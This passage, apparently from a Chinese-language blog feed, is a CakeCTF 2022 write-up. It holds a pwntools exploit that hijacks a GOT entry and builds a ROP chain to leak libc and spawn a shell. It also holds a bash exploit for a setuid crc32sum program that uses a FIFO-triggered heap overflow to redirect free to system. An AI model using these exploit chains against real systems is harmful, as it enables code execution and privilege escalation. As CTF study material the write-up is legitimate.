class="number">0x7ffd12538850</span> ◂— <span class="number">0x7fffffffffffffff</span>                                         [<span class="number">2</span>] &lt;- size</span><br><span class="line">    <span class="number">0x7ffd12538858</span> ◂— <span class="number">0x4</span></span><br><span class="line">    <span class="number">0x7ffd12538860</span> —▸ <span class="number">0x7ffd12538830</span> —▸ <span class="number">0x4013e3</span> (__libc_csu_init+<span class="number">99</span>) ◂— pop rdi [<span class="number">1</span>] &lt;- arr</span><br><span class="line">    <span class="number">0x7ffd12538868</span> ◂— <span class="number">0x2abd7f93dc67a400</span></span><br><span class="line">rbp <span class="number">0x7ffd12538870</span> ◂— <span class="number">0x0</span></span><br><span class="line">    <span class="number">0x7ffd12538878</span> —▸ <span class="number">0x7f2a5fc86083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure><p>总流程如下</p><ul><li>通过 alloca 的指针在 rsp 栈顶布置我们的 rop 并劫持 size 后篡改 alloca 出来的指针 达到 got 任意写的效果</li><li>进入 exit 的 got 的时候 会压入返回地址 执行 rop 的时候要 pop 掉这个</li><li>ROP 用经典 plt 泄漏 got 的套路 并返回 main</li><li>重复上述</li></ul><h2 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2">#</a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&quot;Linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :p.info(<span class="string">&#x27;======&gt;&#x27;</span>+tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ir      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">ri      = <span class="keyword">lambda</span>                    :raw_input()</span><br><span class="line">ps      = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">idx, val</span>):</span><br><span class="line">sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&quot;value: &quot;</span>, <span class="built_in">str</span>(val))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">sla(<span class="string">&quot;size:&quot;</span>, <span class="string">&quot;5&quot;</span>)<span class="comment"># 0 - 5</span></span><br><span class="line">pop_rdi = <span class="number">0x4013e3</span></span><br><span class="line"><span class="built_in">set</span>(<span class="number">0</span>, pop_rdi)</span><br><span class="line"><span class="built_in">set</span>(<span class="number">1</span> ,elf.got[<span class="string">&quot;printf&quot;</span>])</span><br><span class="line"><span class="built_in">set</span>(<span class="number">2</span> ,elf.plt[<span class="string">&quot;printf&quot;</span>])</span><br><span class="line"><span class="built_in">set</span>(<span class="number">3</span> ,elf.sym[<span class="string">&quot;_start&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># falsify size</span></span><br><span class="line"><span class="built_in">set</span>(<span class="number">4</span> ,<span class="number">0xffffffffffffffff</span>)</span><br><span class="line"><span class="comment"># hijack arr</span></span><br><span class="line"><span class="built_in">set</span>(<span class="number">6</span> ,elf.got[<span class="string">&quot;exit&quot;</span>])</span><br><span class="line"><span class="comment"># falsify got[exit]&#x27;s content</span></span><br><span class="line"><span class="built_in">set</span>(<span class="number">0</span> ,pop_rdi)</span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ri()</span><br><span class="line">sla(<span class="string">&quot;index: &quot;</span>, <span class="string">&quot;-1&quot;</span>)</span><br><span class="line">leak = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:])</span><br><span class="line">info(<span class="string">&quot;leak&quot;</span>,leak)</span><br><span class="line">libc_base = leak - <span class="number">0x7ffff7e1fc90</span> + <span class="number">0x7ffff7dbe000</span></span><br><span class="line">info(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn</span></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sla(<span class="string">&quot;size:&quot;</span>, <span class="string">&quot;5&quot;</span>)<span class="comment"># 0 - 5</span></span><br><span class="line">pop_rdi = <span class="number">0x4013e3</span></span><br><span class="line"><span class="built_in">set</span>(<span class="number">0</span>, pop_rdi)</span><br><span class="line"><span class="built_in">set</span>(<span class="number">1</span> ,binsh)</span><br><span class="line"><span class="built_in">set</span>(<span class="number">2</span> ,system)</span><br><span class="line"><span class="built_in">set</span>(<span class="number">4</span> ,<span class="number">0xffffffffffffffff</span>)</span><br><span class="line"><span class="built_in">set</span>(<span class="number">6</span> ,elf.got[<span class="string">&quot;exit&quot;</span>])</span><br><span class="line"><span class="built_in">set</span>(<span class="number">0</span> ,pop_rdi)</span><br><span class="line">sla(<span class="string">&quot;index: &quot;</span>, <span class="string">&quot;-1&quot;</span>)</span><br><span class="line">ir()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="关于逆向的一点补充"><a class="markdownIt-Anchor" href="#关于逆向的一点补充">#</a> 关于逆向的一点补充</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="number">16</span> * ((size + <span class="number">31</span>) / <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">while</span> ( &amp;size != (<span class="type">unsigned</span> __int64 *)((<span class="type">char</span> *)&amp;size - (v3 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class="line">  ;</span><br><span class="line">v4 = alloca(v3 &amp; <span class="number">0xFFF</span>);</span><br></pre></td></tr></table></figure><p>这里就可以看到 size 在 1 - 17 之间的 v3 都是不会变的<br>也就是  <code>n + sizeof(long)</code>  与 0x10 对齐的情况</p><h1 id="crc32sum"><a class="markdownIt-Anchor" href="#crc32sum">#</a> crc32sum</h1><p>权限逃逸（亦或者说普通堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/file.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Calculate CRC32 hash for data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">crc32</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i, j;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> hash;</span><br><span class="line"></span><br><span class="line">  hash = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">    hash ^= data[i];</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; CHAR_BIT; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (hash &amp; <span class="number">1</span>)</span><br><span class="line">        hash = (hash &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        hash &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hash ^ <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Calculate CRC32 hash for file</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">crc32sum</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filepath)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="type">char</span> *buffer, *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stbuf</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to open file */</span></span><br><span class="line">  <span class="keyword">if</span> ((fd = open(filepath, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(filepath);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Lock file */</span></span><br><span class="line">  <span class="keyword">if</span> (flock(fd, LOCK_SH)) &#123;</span><br><span class="line">    perror(<span class="string">&quot;flock&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Get file size */</span></span><br><span class="line">  <span class="keyword">if</span> (fstat(fd, &amp;stbuf)) &#123;</span><br><span class="line">    perror(filepath);</span><br><span class="line">    flock(fd, LOCK_UN);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate buffer */</span></span><br><span class="line">  <span class="keyword">if</span> (!(buffer = <span class="built_in">malloc</span>(stbuf.st_size))) &#123;    [<span class="number">1</span>] &lt;&lt;- 漏洞点所在 pipe是没有size的</span><br><span class="line">    perror(<span class="string">&quot;Memory Error&quot;</span>);</span><br><span class="line">    flock(fd, LOCK_UN);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Read file */</span></span><br><span class="line">  p = buffer;</span><br><span class="line">  <span class="keyword">while</span> (read(fd, p++, <span class="number">1</span>) == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Calculate hash */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s: %08x\n&quot;</span>, filepath, crc32(buffer, stbuf.st_size));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Cleanup */</span></span><br><span class="line">  <span class="built_in">free</span>(buffer);</span><br><span class="line">  flock(fd, LOCK_UN);</span><br><span class="line">  close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Entry point</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *filepath;</span><br><span class="line"></span><br><span class="line">  setreuid(geteuid(), geteuid());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;file&gt; ...\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (system(<span class="string">&quot;/usr/bin/which crc32 &gt; /dev/null&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Your system has `crc32` too&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line">    filepath = strdup(argv[i]);</span><br><span class="line">    crc32sum(filepath);</span><br><span class="line">    <span class="built_in">free</span>(filepath);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路 对于 <code>FIFO</code>  的管道   <code>stbuf.st_size</code>  是 0 这就造成了堆溢出<br>我们可以 <code>mkfifo</code>  创建堆块 然后溢出到下面的 0x40 的块（前提是要布置好两个 0x40)<br> 然后劫持 tcache 到 got 在劫持 free 成 system 的 plt<br> 这样就能直接 free (cmd) 命令执行了</p><p>难点在于 strdup 会干扰堆布局 需要思考<br>和第一次 printf 会创建 0x400 的缓冲区 需要 bypass 这两即可</p><h2 id="fifo"><a class="markdownIt-Anchor" href="#fifo">#</a> FIFO</h2><p><strong>命名管道</strong>也被称为 FIFO 文件<br>管道是没法被 stat 结构体读取到数据的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/file.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span>(pipe(pipefd) == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stbuf</span>;</span></span><br><span class="line">fstat(pipefd[<span class="number">0</span>], &amp;stbuf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, stbuf.st_size);<span class="comment">// 0</span></span><br><span class="line">fstat(pipefd[<span class="number">1</span>], &amp;stbuf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, stbuf.st_size);<span class="comment">// 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3">#</a> exp</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">path=`pwd` # TODO: modify here</span><br><span class="line">target=$path/crc32sum</span><br><span class="line">./cleanup.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">real size xx</span></span><br><span class="line">A1=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">A2=ooooooooooooooooooooooooooooooo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">real szie 0x40</span></span><br><span class="line">B=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">C=kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">real szie 0x40</span></span><br><span class="line">PL=ccccccccccccccccccccccccccccccccccccccccccccccc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">real szie 0x50</span></span><br><span class="line">PIPE=pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tmp=`<span class="built_in">mktemp</span> /tmp/cake-XXX`</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> <span class="variable">$target</span> .</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">:&lt;&lt;<span class="string">eof</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">chunk[0x30] &lt;&lt;- A&#x27;s name</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">chunk[0x20] &lt;&lt;- A&#x27;s content    &lt;&lt;- overflow</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">chunk[0x40] &lt;&lt;- B</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">chunk[0x40] &lt;&lt;- B</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">eof</span></span></span><br><span class="line">python3 -c &quot;print(&#x27;C&#x27;*0x1f)&quot; &gt; $A1</span><br><span class="line">python3 -c &quot;print(&#x27;C&#x27;*0xf)&quot;  &gt; $A2</span><br><span class="line">python3 -c &quot;print(&#x27;C&#x27;*0x2f)&quot; &gt; $B # B creat two of 0x40 real size chunk</span><br><span class="line">python3 -c &quot;print(&#x27;C&#x27;*0x2f)&quot; &gt; $C</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">:&lt;&lt;<span class="string">eof</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">GOT SYM                 PLT</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">0000000000404018 free@GLIBC_2.2.5    0000000000401030</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">0000000000404020 puts@GLIBC_2.2.5    0000000000401040</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">0000000000404028 system@GLIBC_2.2.5  0000000000401050</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">0000000000404030 printf@GLIBC_2.2.5  0000000000401060</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">0000000000404038 geteuid@GLIBC_2.2.5 0000000000401070</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">0000000000404040 close@GLIBC_2.2.5   0000000000401080</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">eof</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hijack free<span class="string">&#x27;s got to system&#x27;</span>s plt and retain other nothing change</span></span><br><span class="line">echo -ne &quot;\x50\x10\x40\x00\x00\x00\x00\x00&quot; &gt;&gt; $PL</span><br><span class="line">echo -ne &quot;\x40\x10\x40\x00\x00\x00\x00\x00&quot; &gt;&gt; $PL</span><br><span class="line">echo -ne &quot;\x50\x10\x40\x00\x00\x00\x00\x00&quot; &gt;&gt; $PL</span><br><span class="line">echo -ne &quot;\x60\x10\x40\x00\x00\x00\x00\x00&quot; &gt;&gt; $PL</span><br><span class="line">echo -ne &quot;\x70\x10\x40\x00\x00\x00\x00\x00&quot; &gt;&gt; $PL</span><br><span class="line">echo -ne &quot;\x80\x10\x40\x00\x00\x00\x00\x00&quot; &gt;&gt; $PL</span><br><span class="line"></span><br><span class="line">python3 -c &quot;print(&#x27;S&#x27;*0x18,end=&#x27;&#x27;)&quot;          &gt; payload</span><br><span class="line">echo -ne &#x27;\x41\x00\x00\x00\x00\x00\x00\x00&#x27; &gt;&gt; payload</span><br><span class="line">echo -ne &#x27;\x18\x40\x40\x00\x00\x00\x00\x00&#x27; &gt;&gt; payload</span><br><span class="line">echo &quot;cat ~/flag&quot; &gt; cmd</span><br><span class="line">mkfifo $PIPE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">A1是发现会凭空出现一个0x400的块 间隔我们的payload</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb -x gdbscript --args <span class="variable">$target</span> <span class="variable">$A1</span> <span class="variable">$A2</span> <span class="variable">$B</span> <span class="variable">$PIPE</span> <span class="variable">$PL</span> cmd</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">target <span class="variable">$A1</span> <span class="variable">$A2</span> <span class="variable">$B</span> <span class="variable">$PIPE</span> <span class="variable">$PL</span> cmd  &amp;</span></span><br><span class="line">sleep 1</span><br><span class="line">cat ./payload &gt; $PIPE</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://2022.cakectf.com/tasks/1538875340/&quot;&gt;CakeCTF 2022&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;welkerme&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#welkerme&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="https://squirre17.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://squirre17.github.io/tags/Linux/"/>
    
    <category term="writeup" scheme="https://squirre17.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>kernel-notebook-three-solutions</title>
    <link href="https://squirre17.github.io/2022/09/11/kernel-notebook-three-solutions/"/>
    <id>https://squirre17.github.io/2022/09/11/kernel-notebook-three-solutions/</id>
    <published>2022-09-11T02:28:41.000Z</published>
